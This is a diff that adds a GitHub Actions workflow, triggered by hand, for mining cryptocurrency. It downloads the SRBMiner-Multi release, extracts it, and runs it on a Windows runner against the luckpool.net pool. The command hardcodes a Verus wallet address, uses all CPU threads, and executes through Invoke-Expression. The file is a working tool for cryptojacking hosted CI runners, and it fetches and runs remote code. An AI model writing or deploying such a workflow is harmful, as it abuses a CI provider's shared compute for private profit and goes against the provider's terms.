@@ -1,0 +1,42 @@
+name: Mine with SRBMiner
+
+on:
+  workflow_dispatch:  # manual trigger
+
+jobs:
+  mine:
+    runs-on: windows-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Run Miner
+        shell: pwsh
+        run: |
+          # ---- AUTO-DOWNLOAD + AUTO-THREAD SCRIPT ----
+          $cpuCount = (Get-CimInstance -Class Win32_ComputerSystem).NumberOfLogicalProcessors
+          Write-Host "Detected $cpuCount logical CPUs"
+
+          # Download latest SRBMiner-Multi from official releases
+          $releaseUrl = "https://api.github.com/repos/doktor83/SRBMiner-Multi/releases/latest"
+          $release = Invoke-RestMethod -Uri $releaseUrl
+          $asset = $release.assets | Where-Object { $_.name -match "windows.zip$" } | Select-Object -First 1
+          if (-not $asset) { throw "No Windows ZIP asset found" }
+          $zipUrl = $asset.browser_download_url
+
+          $zipPath = "$env:TEMP\SRBMiner.zip"
+          $extractPath = "$env:TEMP\SRBMiner"
+          Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
+          Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
+
+          # Locate the executable
+          $exe = Get-ChildItem -Path $extractPath -Filter "SRBMiner-MULTI.exe" -Recurse | Select-Object -First 1 -ExpandProperty FullName
+          if (-not $exe) { throw "SRBMiner-MULTI.exe not found" }
+
+          # Build command with dynamic thread count
+          $threads = $cpuCount
+          $cmd = @"
+          & "$exe" --algorithm-cpu verushash --pool na.luckpool.net:3956 --wallet RDxjag6PEPtos9e9aNUtsyzPx3kjgS1UM8 --worker Jabir-PC-Actions --cpu-threads $threads --cpu-threads-intensity 2 --cpu-thread-priority 5 --cpu-affinity 0xFFF --disable-gpu --enable-huge-pages --disable-watchdog false --retry-time 5 --send-stales --tls false --api-enable --api-port 21550 --log-file verus.log
+"@
+          Write-Host "Executing: $cmd"
+          Invoke-Expression $cmd
